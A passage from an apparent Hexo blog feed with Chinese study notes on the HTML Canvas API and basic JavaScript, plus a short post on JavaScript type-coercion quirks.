title="二次贝塞尔曲线及三次贝塞尔曲线"></a>二次贝塞尔曲线及三次贝塞尔曲线</h3><p><a href="https://en.wikipedia.org/wiki/B%C3%A9zier_curve" target="_blank" rel="noopener">Bézier curve</a></p><p><code>quadraticCurveTo(cp1x, cp1y, x, y)</code><br>绘制二次贝塞尔曲线，cp1x,cp1y为一个控制点，x,y为结束点。</p><p><code>bezierCurveTo(cp1x, cp1y, cp2x, cp2y, x, y)</code><br>绘制三次贝塞尔曲线，cp1x,cp1y为控制点一，cp2x,cp2y为控制点二，x,y为结束点。</p><h3 id="矩形"><a href="#矩形" class="headerlink" title="矩形"></a>矩形</h3><p><code>rect(x, y, width, height)</code><br>绘制一个左上角坐标为（x,y），宽高为width以及height的矩形。<br>当该方法执行的时候，moveTo()方法自动设置坐标参数（0,0）。也就是说，当前笔触自动重置回默认坐标。</p><h3 id="Path2D对象"><a href="#Path2D对象" class="headerlink" title="Path2D对象"></a>Path2D对象</h3><p><code>Path2D()</code><br>Path2D()会返回一个新初始化的Path2D对象（可能将某一个路径作为变量——创建一个它的副本，或者将一个包含SVG path数据的字符串作为变量）。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">new Path2D();     // 空的Path对象</span><br><span class="line">new Path2D(path); // 克隆Path对象</span><br><span class="line">new Path2D(d);    // 从SVG建立Path对象</span><br></pre></td></tr></table></figure><p><code>Path2D.addPath(path [, transform])​</code><br>添加了一条路径到当前路径（可能添加了一个变换矩阵）。</p><p><a href="https://developer.mozilla.org/en-US/docs/Web/API/Path2D/Path2D#Using_SVG_paths" target="_blank" rel="noopener">关于Path2D()</a></p><h2 id="颜色"><a href="#颜色" class="headerlink" title="颜色"></a>颜色</h2><p><code>fillStyle = color</code><br>设置图形的填充颜色。</p><p><code>strokeStyle = color</code><br>设置图形轮廓的颜色</p><p>color是符合<a href="https://www.w3.org/TR/css-color-3/" target="_blank" rel="noopener">CSS3color</a> 的字符串</p><h3 id="透明度"><a href="#透明度" class="headerlink" title="透明度"></a>透明度</h3><p><code>globalAlpha = transparencyValue</code><br>这个属性影响到 canvas 里所有图形的透明度，有效的值范围是 0.0 （完全透明）到 1.0（完全不透明），默认是 1.0。<br>globalAlpha 属性在需要绘制大量拥有相同透明度的图形时候相当高效。</p><p>因为 strokeStyle 和 fillStyle 属性接受符合 CSS 3 规范的颜色值，那我们可以用下面的写法来设置具有透明度的颜色。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">// 指定透明颜色，用于描边和填充样式</span><br><span class="line">ctx.strokeStyle = &quot;rgba(255,0,0,0.5)&quot;;</span><br><span class="line">ctx.fillStyle = &quot;rgba(255,0,0,0.5)&quot;;</span><br></pre></td></tr></table></figure><p>rgba() 方法与 rgb() 方法类似，就多了一个用于设置色彩透明度的参数。它的有效范围是从 0.0（完全透明）到 1.0（完全不透明）。</p><h3 id="线型"><a href="#线型" class="headerlink" title="线型"></a>线型</h3><p><code>lineWidth = value</code><br>设置线条宽度。</p><p><code>lineCap = type</code><br>设置线条末端样式。</p><p>type 参数为: butt，round 和 square。默认是 butt。<br>butt 是刚好平齐，round 和 square 都会多出一块，一个是圆形，一个是矩形。</p><p><code>lineJoin = type</code><br>设定线条与线条间接合处的样式。<br>type 参数为: round, bevel 和 miter。默认是 miter。<br>折线分别为圆弧形，被切去尖角，尖角</p><p><code>miterLimit = value</code><br>限制当两条线相交时交接处最大长度；所谓交接处长度（斜接长度）是指线条交接处内角顶点到外角顶点的长度。<br>可以限制上面的参数，miter超过限制时就会变成bevel</p><p><code>getLineDash()</code><br>返回一个包含当前虚线样式，长度为非负偶数的数组。</p><p><code>setLineDash(segments)</code><br>设置当前虚线样式。接受一个数组，设置线段和间隙。</p><p><code>lineDashOffset = value</code><br>设置虚线样式的起始偏移量。</p><h3 id="渐变"><a href="#渐变" class="headerlink" title="渐变"></a>渐变</h3><p><code>createLinearGradient(x1, y1, x2, y2)</code><br>createLinearGradient 方法接受 4 个参数，表示渐变的起点 (x1,y1) 与终点 (x2,y2)。</p><p><code>createRadialGradient(x1, y1, r1, x2, y2, r2)</code><br>createRadialGradient 方法接受 6 个参数，前三个定义一个以 (x1,y1) 为原点，半径为 r1 的圆，后三个参数则定义另一个以 (x2,y2) 为原点，半径为 r2 的圆。</p><p><code>gradient.addColorStop(position, color)</code><br>addColorStop 方法接受 2 个参数，position 参数必须是一个 0.0 与 1.0 之间的数值，表示渐变中颜色所在的相对位置。例如，0.5 表示颜色会出现在正中间。color 参数必须是一个有效的 CSS 颜色值（如 #FFF， rgba(0,0,0,1)，等等）。</p><p>然后可以将这些渐变色赋值给fillStyle 和 strokeStyle</p><h3 id="图案样式"><a href="#图案样式" class="headerlink" title="图案样式"></a>图案样式</h3><p><code>createPattern(image, type)</code><br>该方法接受两个参数。Image 可以是一个 Image 对象的引用，或者另一个 canvas 对象。<br>Type 必须是下面的字符串值之一：repeat，repeat-x，repeat-y 和 no-repeat。</p><p>图案的应用跟渐变很类似的，创建出一个 pattern 之后，赋给 fillStyle 或 strokeStyle 属性即可。</p><h3 id="阴影"><a href="#阴影" class="headerlink" title="阴影"></a>阴影</h3><p><code>shadowOffsetX = float</code><br><code>shadowOffsetY = float</code><br>shadowOffsetX 和 shadowOffsetY 用来设定阴影在 X 和 Y 轴的延伸距离，它们是不受变换矩阵所影响的。负值表示阴影会往上或左延伸，正值则表示会往下或右延伸，它们默认都为 0。</p><p><code>shadowBlur = float</code><br>shadowBlur 用于设定阴影的模糊程度，其数值并不跟像素数量挂钩，也不受变换矩阵的影响，默认为 0。</p><p><code>shadowColor = color</code><br>shadowColor 是标准的 CSS 颜色值，用于设定阴影颜色效果，默认是全透明的黑色。</p><h3 id="Canvas-填充规则"><a href="#Canvas-填充规则" class="headerlink" title="Canvas 填充规则"></a>Canvas 填充规则</h3><p>当我们用到 fill（或者 clip和isPointinPath）你可以选择一个填充规则，该填充规则根据某处在路径的外面或者里面来决定该处是否被填充，这对于自己与自己路径相交或者路径被嵌套的时候是有用的。</p><p>两个可取的值：<br> “nonzero”: non-zero winding rule, 默认值.<br> “evenodd”:  even-odd winding rule.</p><h2 id="绘制文本"><a href="#绘制文本" class="headerlink" title="绘制文本"></a>绘制文本</h2><p><code>fillText(text, x, y [, maxWidth])</code><br>在指定的(x,y)位置填充指定的文本，绘制的最大宽度是可选的.</p><p><code>strokeText(text, x, y [, maxWidth])</code><br>在指定的(x,y)位置绘制文本边框，绘制的最大宽度是可选的.</p><h3 id="文本样式"><a href="#文本样式" class="headerlink" title="文本样式"></a>文本样式</h3><p><code>font = value</code><br>当前我们用来绘制文本的样式. 这个字符串使用和 CSS font 属性相同的语法. 默认的字体是 <code>10px sans-serif</code>。</p><p><code>textAlign = value</code><br>文本对齐选项. 可选的值包括：<code>start</code>, <code>end</code>, <code>left</code>, <code>right</code> or <code>center</code>. 默认值是 <code>start</code>。</p><p><code>textBaseline = value</code><br>基线对齐选项. 可选的值包括：<code>top</code>, <code>hanging</code>, <code>middle</code>, <code>alphabetic</code>, <code>ideographic</code>, <code>bottom</code>。默认值是 <code>alphabetic</code>。</p><p><code>direction = value</code><br>文本方向。可能的值包括：<code>ltr</code>, <code>rtl</code>, <code>inherit</code>。默认值是 <code>inherit</code>。<br>ltr: left-to-right,rtl: right-to-left</p><p><code>measureText()</code><br>将返回一个 TextMetrics对象的宽度、所在像素，这些体现文本特性的属性，可以获得更多细节。</p><h2 id="图像"><a href="#图像" class="headerlink" title="图像"></a>图像</h2><h3 id="获取图片"><a href="#获取图片" class="headerlink" title="获取图片"></a>获取图片</h3><p><code>HTMLImageElement</code><br>这些图片是由Image()函数构造出来的，或者任何的<img>元素</p><p><code>HTMLVideoElement</code><br>用一个HTML的 <video>元素作为你的图片源，可以从视频中抓取当前帧作为一个图像</video></p><p><code>HTMLCanvasElement</code><br>可以使用另一个 <canvas> 元素作为你的图片源。</canvas></p><p><code>ImageBitmap</code><br>这是一个高性能的位图，可以低延迟地绘制，它可以从上述的所有源以及其它几种源中生成。</p><p><a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API/Tutorial/Using_images" target="_blank" rel="noopener">详细使用请移步吧…</a></p><h3 id="绘制图片"><a href="#绘制图片" class="headerlink" title="绘制图片"></a>绘制图片</h3><p><code>drawImage(image, x, y)</code><br>其中 image 是 image 或者 canvas 对象，x 和 y 是其在目标 canvas 里的起始坐标。</p><p><code>drawImage(image, x, y, width, height)</code><br>这个方法多了2个参数：width 和 height，这两个参数用来控制 当向canvas画入时应该缩放的大小</p><p><code>drawImage(image, sx, sy, sWidth, sHeight, dx, dy, dWidth, dHeight)</code><br>第一个参数和其它的是相同的，都是一个图像或者另一个 canvas 的引用。其它8个参数最好是参照右边的图解，前4个是定义图像源的切片位置和大小，后4个则是定义切片的目标显示位置和大小。</p><h2 id="变形"><a href="#变形" class="headerlink" title="变形"></a>变形</h2><h3 id="状态保存和恢复"><a href="#状态保存和恢复" class="headerlink" title="状态保存和恢复"></a>状态保存和恢复</h3><p><code>save()restore()</code><br>save 和 restore 方法是用来保存和恢复 canvas 状态的，都没有参数。Canvas 的状态就是当前画面应用的所有样式和变形的一个快照。</p><p>一个绘画状态包括：<br>当前应用的变形（即移动，旋转和缩放，见下）<br>strokeStyle, fillStyle, globalAlpha, lineWidth, lineCap, lineJoin, miterLimit, shadowOffsetX, shadowOffsetY, shadowBlur, shadowColor, globalCompositeOperation 的值</p><h3 id="移动"><a href="#移动" class="headerlink" title="移动"></a>移动</h3><p><code>translate(x, y)</code><br>translate 方法接受两个参数。x 是左右偏移量，y 是上下偏移量，用来移动 canvas 和它的原点到一个不同的位置。</p><h3 id="旋转"><a href="#旋转" class="headerlink" title="旋转"></a>旋转</h3><p><code>rotate(angle)</code><br>这个方法只接受一个参数：旋转的角度(angle)，它是顺时针方向的，以弧度为单位的值<br>旋转的中心点始终是 canvas 的原点，如果要改变它，我们需要用到 translate 方法。</p><h3 id="缩放"><a href="#缩放" class="headerlink" title="缩放"></a>缩放</h3><p><code>scale(x, y)</code><br>scale 方法接受两个参数。x,y 分别是横轴和纵轴的缩放因子，它们都必须是正值。值比 1.0 小表示缩小，比 1.0 大则表示放大，值为 1.0 时什么效果都没有。</p><h3 id="变形-1"><a href="#变形-1" class="headerlink" title="变形"></a>变形</h3><p><code>transform(m11, m12, m21, m22, dx, dy)</code><br>这个方法是将当前的变形矩阵乘上一个基于自身参数的矩阵<br>m11：水平方向的缩放<br>m12：水平方向的倾斜偏移<br>m21：竖直方向的倾斜偏移<br>m22：竖直方向的缩放<br>dx：水平方向的移动<br>dy：竖直方向的移动</p><p><code>setTransform(m11, m12, m21, m22, dx, dy)</code></p><p><code>resetTransform()</code></p><h3 id="组合"><a href="#组合" class="headerlink" title="组合"></a>组合</h3><p><code>globalCompositeOperation = type</code><br>这个属性设定了在画新图形时采用的遮盖策略，其值是一个标识12种遮盖方式的字符串。</p><div class="table-container"><table><thead><tr><th style="text-align:center">type</th><th style="text-align:center">Description</th></tr></thead><tbody><tr><td style="text-align:center">source-over</td><td style="text-align:center">这是默认设置，并在现有画布上下文之上绘制新图形。</td></tr><tr><td style="text-align:center">source-in</td><td style="text-align:center">新图形只在新图形和目标画布重叠的地方绘制。其他的都是透明的。</td></tr><tr><td style="text-align:center">source-out</td><td style="text-align:center">在不与现有画布内容重叠的地方绘制新图形。</td></tr><tr><td style="text-align:center">source-atop</td><td style="text-align:center">新图形只在与现有画布内容重叠的地方绘制。</td></tr><tr><td style="text-align:center">destination-over</td><td style="text-align:center">在现有的画布内容后面绘制新的图形。</td></tr><tr><td style="text-align:center">destination-in</td><td style="text-align:center">现有的画布内容保持在新图形和现有画布内容重叠的位置。其他的都是透明的。</td></tr><tr><td style="text-align:center">destination-out</td><td style="text-align:center">现有内容保持在新图形不重叠的地方。</td></tr><tr><td style="text-align:center">destination-atop</td><td style="text-align:center">现有的画布只保留与新图形重叠的部分，新的图形是在画布内容后面绘制的。</td></tr><tr><td style="text-align:center">lighter</td><td style="text-align:center">两个重叠图形的颜色是通过颜色值相加来确定的。</td></tr><tr><td style="text-align:center">copy</td><td style="text-align:center">只显示新图形。</td></tr><tr><td style="text-align:center">xor</td><td style="text-align:center">图像中，那些重叠和正常绘制之外的其他地方是透明的。</td></tr><tr><td style="text-align:center">multiply</td><td style="text-align:center">将顶层像素与底层相应像素相乘，结果是一幅更黑暗的图片。</td></tr><tr><td style="text-align:center">screen</td><td style="text-align:center">像素被倒转，相乘，再倒转，结果是一幅更明亮的图片。</td></tr><tr><td style="text-align:center">overlay</td><td style="text-align:center">multiply和screen的结合，原本暗的地方更暗，原本亮的地方更亮。</td></tr><tr><td style="text-align:center">darken</td><td style="text-align:center">保留两个图层中最暗的像素。</td></tr><tr><td style="text-align:center">lighten</td><td style="text-align:center">保留两个图层中最亮的像素。</td></tr><tr><td style="text-align:center">color-dodge</td><td style="text-align:center">将底层除以顶层的反置。</td></tr><tr><td style="text-align:center">color-burn</td><td style="text-align:center">将反置的底层除以顶层，然后将结果反过来。</td></tr><tr><td style="text-align:center">hard-light</td><td style="text-align:center">屏幕相乘（A combination of multiply and screen）类似于叠加，但上下图层互换了。</td></tr><tr><td style="text-align:center">soft-light</td><td style="text-align:center">用顶层减去底层或者相反来得到一个正值。</td></tr><tr><td style="text-align:center">difference</td><td style="text-align:center">一个柔和版本的强光（hard-light）。纯黑或纯白不会导致纯黑或纯白。</td></tr><tr><td style="text-align:center">exclusion</td><td style="text-align:center">和difference相似，但对比度较低。</td></tr><tr><td style="text-align:center">hue</td><td style="text-align:center">保留了底层的亮度（luma）和色度（chroma），同时采用了顶层的色调（hue）。</td></tr><tr><td style="text-align:center">saturation</td><td style="text-align:center">保留底层的亮度（luma）和色调（hue），同时采用顶层的色度（chroma）。</td></tr><tr><td style="text-align:center">color</td><td style="text-align:center">保留了底层的亮度（luma），同时采用了顶层的色调(hue)和色度(chroma)。</td></tr><tr><td style="text-align:center">luminosity</td><td style="text-align:center">保持底层的色调（hue）和色度（chroma），同时采用顶层的亮度（luma）。</td></tr></tbody></table></div><h3 id="裁切路径"><a href="#裁切路径" class="headerlink" title="裁切路径"></a>裁切路径</h3><p><code>clip()</code><br>将当前正在构建的路径转换为当前的裁剪路径。</p><p>限制绘制区域</p><h2 id="基本动画"><a href="#基本动画" class="headerlink" title="基本动画"></a>基本动画</h2><h3 id="基本步骤"><a href="#基本步骤" class="headerlink" title="基本步骤"></a>基本步骤</h3><p>清空 canvas<br>除非接下来要画的内容会完全充满 canvas （例如背景图），否则你需要清空所有。最简单的做法就是用 clearRect 方法。</p><p>保存 canvas 状态<br>如果你要改变一些会改变 canvas 状态的设置（样式，变形之类的），又要在每画一帧之时都是原始状态的话，你需要先保存一下。</p><p>绘制动画图形（animated shapes）<br>这一步才是重绘动画帧。</p><p>恢复 canvas 状态<br>如果已经保存了 canvas 的状态，可以先恢复它，然后重绘下一帧。</p><h3 id="操控动画"><a href="#操控动画" class="headerlink" title="操控动画"></a>操控动画</h3><p>更新画布<br>首先，可以用<code>window.setInterval()</code>, <code>window.setTimeout()</code>,和<code>window.requestAnimationFrame()</code>来设定定期执行一个指定函数。</p><p><code>setInterval(function, delay)</code><br>当设定好间隔时间后，function会定期执行。</p><p><code>setTimeout(function, delay)</code><br>在设定好的时间之后执行函数</p><p><code>requestAnimationFrame(callback)</code><br>告诉浏览器你希望执行一个动画，并在重绘之前，请求浏览器执行一个特定的函数来更新动画。</p><h2 id="高级动画"><a href="#高级动画" class="headerlink" title="高级动画"></a>高级动画</h2><p><a href="https://developer.mozilla.org/en-US/docs/Web/Events" target="_blank" rel="noopener">一个事件库</a></p><h2 id="像素操作"><a href="#像素操作" class="headerlink" title="像素操作"></a>像素操作</h2><h3 id="ImageData对象"><a href="#ImageData对象" class="headerlink" title="ImageData对象"></a>ImageData对象</h3><p><code>width</code><br>图片宽度，单位是像素</p><p><code>height</code><br>图片高度，单位是像素</p><p><code>data</code><br>Uint8ClampedArray类型的一维数组，包含着RGBA格式的整型数据，范围在0至255之间（包括255）</p><h3 id="创建ImageData对象"><a href="#创建ImageData对象" class="headerlink" title="创建ImageData对象"></a>创建ImageData对象</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">var myImageData = ctx.createImageData(width, height);</span><br><span class="line">var myImageData = ctx.createImageData(anotherImageData);</span><br></pre></td></tr></table></figure><p>创建出来的像素都被预设成透明黑</p><h3 id="得到场景像素数据"><a href="#得到场景像素数据" class="headerlink" title="得到场景像素数据"></a>得到场景像素数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var myImageData = ctx.getImageData(left, top, width, height);</span><br></pre></td></tr></table></figure><h3 id="在场景中写入像素数据"><a href="#在场景中写入像素数据" class="headerlink" title="在场景中写入像素数据"></a>在场景中写入像素数据</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.putImageData(myImageData, dx, dy);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> note </category>
          
      </categories>
      
      
        <tags>
            
            <tag> javascript </tag>
            
            <tag> canvas </tag>
            
            <tag> note </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>20181120</title>
      <link href="/blog/20181120/"/>
      <url>/blog/20181120/</url>
      
        <content type="html"><![CDATA[<p>仿佛发现了新的快乐源泉！</p><p><code>&quot;B&quot;+&quot;a&quot;+ +&quot;B&quot;+&quot;a&quot;</code> 这句在JavaScript中会输出 <code>BaNaNa</code> !</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">"B"</span>+<span class="string">"a"</span>+ +<span class="string">"B"</span>+<span class="string">"a"</span> <span class="comment">// "BaNaNa"</span></span><br><span class="line">[] == ![];<span class="comment">// "true"</span></span><br><span class="line"><span class="number">2</span> == [<span class="number">2</span>];<span class="comment">// true</span></span><br><span class="line"><span class="string">""</span> == [<span class="literal">null</span>];<span class="comment">// true</span></span><br><span class="line"><span class="literal">NaN</span> == <span class="literal">NaN</span> <span class="comment">// false</span></span><br></pre></td></tr></table></figure><p>还有很多奇怪的东西都在这里↓<br><a href="https://github.com/getify/You-Dont-Know-JS" target="_blank" rel="noopener">传送门</a></p>]]></content>
      
      
      <categories>
          
          <category> daily </category>
          
      </categories>
      
      
        <tags>
            
            <tag> daily </tag>
            
            <tag> javascript </tag>
            
            <tag> exm </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Javascript笔记</title>
      <link href="/blog/note-javascript/"/>
      <url>/blog/note-javascript/</url>
      
        <content type="html"><![CDATA[<h2 id="JavaScript快速上手"><a href="#JavaScript快速上手" class="headerlink" title="JavaScript快速上手"></a>JavaScript快速上手</h2><h3 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h3><h4 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">var name;</span><br></pre></td></tr></table></figure><h4 id="变量名"><a href="#变量名" class="headerlink" title="变量名"></a>变量名</h4><p>开头可以是任意Unicode字符、美元符、下划线<br>后面的字符除上述以外还有Unicode数字</p><p>不能是关键字<br>关键字：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">arguments   break       case        catch</span><br><span class="line">class       const       continue    debugger</span><br><span class="line">default     delete      do          else</span><br><span class="line">enum        export      extends     false</span><br><span class="line">finally     for         function    if</span><br><span class="line">implements  import      in          instanceof</span><br><span class="line">interface   let         new         null</span><br><span class="line">package     private     protected   public</span><br><span class="line">return      static      super       switch</span><br><span class="line">this        throw       true        try</span><br><span class="line">typeof      var         void        while</span><br></pre></td></tr></table></figure></p><p>3个标识符不是保留字但也要视为保留字</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Infinity    NaN     undefined</span><br></pre></td></tr></table></figure><h4 id="原始值"><a href="#原始值" class="headerlink" title="原始值"></a>原始值</h4><p>有布尔值、数字、字符串、空值(<code>undefine null</code>)<br>特点<br>可进行内容比较<br>其属性不能被改变、添加或移除</p><p>ToPrimitive()将值转换为原始值</p><h3 id="对象"><a href="#对象" class="headerlink" title="对象"></a>对象</h3><p>非原始值都是对象<br>简单对象、数组、正则表达式</p><p>比较身份标识，每个值都有各自的身份标识<br>对象属性可以很自由地改变、添加或移除</p><h3 id="undefined-和-null"><a href="#undefined-和-null" class="headerlink" title="undefined 和 null"></a>undefined 和 null</h3><p>丢失参数、访问不存在的属性会得到undefined<br>null是没有对象<br>可以直接比较相等</p><h3 id="typeof-和-instanceof"><a href="#typeof-和-instanceof" class="headerlink" title="typeof 和 instanceof"></a>typeof 和 instanceof</h3><p>typeof用法<br><code>typeof value;</code></p><div class="table-container"><table><thead><tr><th style="text-align:center">操作数</th><th style="text-align:center">结果</th></tr></thead><tbody><tr><td style="text-align:center">undefined</td><td style="text-align:center">‘undefined’</td></tr><tr><td style="text-align:center">null</td><td style="text-align:center">object</td></tr><tr><td style="text-align:center">布尔值</td><td style="text-align:center">boolean</td></tr><tr><td style="text-align:center">数字</td><td style="text-align:center">number</td></tr><tr><td style="text-align:center">字符串</td><td style="text-align:center">string</td></tr><tr><td style="text-align:center">函数</td><td style="text-align:center">function</td></tr><tr><td style="text-align:center">其他常规值</td><td style="text-align:center">object</td></tr><tr><td style="text-align:center">引擎创建的值</td><td style="text-align:center">任意字符串</td></tr></tbody></table></div><p>instanceof用法<br><code>value instanceof Constr</code><br>判断value是否由Constr创建</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; undefined instanceof Object</span><br><span class="line">false</span><br></pre></td></tr></table></figure><h3 id="布尔值"><a href="#布尔值" class="headerlink" title="布尔值"></a>布尔值</h3><p>以下值会被认为是false</p><ul><li>undefined\null</li><li>false</li><li>-0,NaN</li><li>‘’</li></ul><p>严格的相等或不等<br><code>=== !==</code><br>宽松的相等或不等<br><code>== !=</code></p><h3 id="数字"><a href="#数字" class="headerlink" title="数字"></a>数字</h3><p>特殊的数字<br>NaN = Not a number<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt; Number(&apos;xyz&apos;)</span><br><span class="line">NaN</span><br></pre></td></tr></table></figure></p><p>检查是否为NaN用isNaN()，但对非数字不起作用，可以用其值是否等于自身来判断</p><p>Infinity<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; 3/0</span><br><span class="line">Infinity</span><br><span class="line">&gt; Math.pow(2,1024)//too large</span><br><span class="line">Infinity</span><br></pre></td></tr></table></figure></p><p>isFinite()可以用来检查是否为实际值，即不为以上两个值</p><p>parseFloat()将字符串中字符转换成数字，对于一些特殊的例如true null ‘’ 无法处理</p><p>JavaScript有两个0，+0，-0</p><p>数字内部表示为双精度</p><div class="table-container"><table><thead><tr><th style="text-align:center">部分</th><th style="text-align:center">位数</th><th style="text-align:center">位置</th></tr></thead><tbody><tr><td style="text-align:center">符号</td><td style="text-align:center">1位</td><td style="text-align:center">第63位</td></tr><tr><td style="text-align:center">指数</td><td style="text-align:center">[-1023,1024] 11位</td><td style="text-align:center">62~52</td></tr><tr><td style="text-align:center">分数</td><td style="text-align:center">52位</td><td style="text-align:center">52~0</td></tr></tbody></table></div><p>表示公式</p><p>$ (-1)^{sign} \times %1.fraction \times 2^{exponent} $</p><p>安全整型范围<br><code>Number.MAX_SAFE_INTEGER=2^53</code><br><code>Number.MIN_SAFE_INTEGER=-2^53</code></p><p>浮点数转化为整数的方法<br><code>Math.floor(),Math.ceil(),Math.round()</code></p><p>位运算或Toint32()得到32位整数</p><p>parseInt()可得到整数，可选基数，在第二个参数</p><p>Number原型方法</p><div class="table-container"><table><thead><tr><th style="text-align:center">函数</th><th style="text-align:center">描述</th></tr></thead><tbody><tr><td style="text-align:center">Number.prototype.toFixed(fractionDigits)</td><td style="text-align:center">舍入到小数点后指定位数</td></tr><tr><td style="text-align:center">Number.prototype.toPrecision(precision)</td><td style="text-align:center">精确到指定位</td></tr><tr><td style="text-align:center">Number.prototype.toString(radix)</td><td style="text-align:center">转化为可选字符串可选进制</td></tr><tr><td style="text-align:center">Number.prototype.toExponential(fractionDigits)</td><td style="text-align:center">强制指数表示</td></tr></tbody></table></div><h3 id="运算符"><a href="#运算符" class="headerlink" title="运算符"></a>运算符</h3><p>基本都一样</p><h3 id="字符串"><a href="#字符串" class="headerlink" title="字符串"></a>字符串</h3><p>原始值 不可改变<br>单引号双引号均可以使用</p><p>一个反斜杠对行结束符转义，使字符串跨行拼写</p><p>可以用&gt;&lt;直接比较 也可以<code>String.prototype.localeCompare(other)</code></p><p>构造器方法<br><code>String.fromCharCode()</code><br><code>String.fromCharCode().apply()</code></p><p>原型方法<br><code>String.prototype.charAt(pos)</code><br><code>String.prototype.charCodeAt(pos) //String.fromCharCode()逆函数</code><br><code>String.prototype.slice(start [,end])</code><br><code>String.prototype.substring(start [,end])</code><br><code>String.prototype.split([separator] [,limit]) //separator可以为正则表达式 limit 是最多包含元素</code></p><p>字符串变换<br><code>String.prototype.trim() //去除开头结尾空格换行符等</code><br><code>String.prototype.concat(str1,str2,...)</code><br><code>String.prototype.toLowerCase()</code><br><code>String.prototype.toLocaleLowerCase()</code><br><code>String.prototype.toUpperCase()</code><br><code>String.prototype.toLocaleUpperCase()</code></p><p>字符串检索和比较<br><code>String.prototype.indexOf(searchString,position)</code><br><code>String.prototype.lastIndexOf(searchString,position)</code><br><code>String.prototype.localeCompare(other)</code></p><p>支持正则表达式的方式<br><code>String.prototype.search(regexp) //返回第一个起始位置，未匹配返回-1</code><br><code>String.prototype.match(regexp) //返回所有匹配的子字符串</code><br><code>String.prototype.replace(search, replacement)</code></p><h3 id="语句"><a href="#语句" class="headerlink" title="语句"></a>语句</h3><p>if/switch/for/while/do-while与C/C++完全相同</p><h3 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h3><p>函数声明方式定义函数<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function add(a, b) &#123;</span><br><span class="line">    return a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>给变量赋值为函数表达式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">var add = function(a, b) &#123;</span><br><span class="line">    return a + b;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h4 id="函数声明的提升特性"><a href="#函数声明的提升特性" class="headerlink" title="函数声明的提升特性"></a>函数声明的提升特性</h4><p>函数声明具有提升特性 他们实体会被移动到所在作用域开始处</p><h4 id="arguments"><a href="#arguments" class="headerlink" title="arguments"></a>arguments</h4><p>JavaScript中所有参数可被调用，通过arguments来使所有参数可用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; function f() &#123; return arguments; &#125;</span><br><span class="line">&gt; var args = f(&apos;a&apos;,&apos;b&apos;,&apos;c&apos;);</span><br><span class="line">&gt; args.length</span><br><span class="line">3</span><br><span class="line">&gt; args[0]</span><br><span class="line">&apos;a&apos;</span><br></pre></td></tr></table></figure></p><h4 id="参数太多或太少"><a href="#参数太多或太少" class="headerlink" title="参数太多或太少"></a>参数太多或太少</h4><p>太多额外的参数会忽略<br>太少丢失的参数会得到undefined</p><h4 id="可选参数"><a href="#可选参数" class="headerlink" title="可选参数"></a>可选参数</h4><p>附上默认值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function pair(x, y) &#123;</span><br><span class="line">    x = x || 0;</span><br><span class="line">    y = y || 0;</span><br><span class="line">    return [x, y];</span><br><span class="line">    </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="限制参数长度"><a href="#限制参数长度" class="headerlink" title="限制参数长度"></a>限制参数长度</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">funton pair(x, y) &#123;</span><br><span class="line">    if(arguments.length !== 2) &#123;</span><br><span class="line">        throw new Error(&apos;Need exactly 2 arguments&apos;);</span><br><span class="line">    &#125;</span><br><span 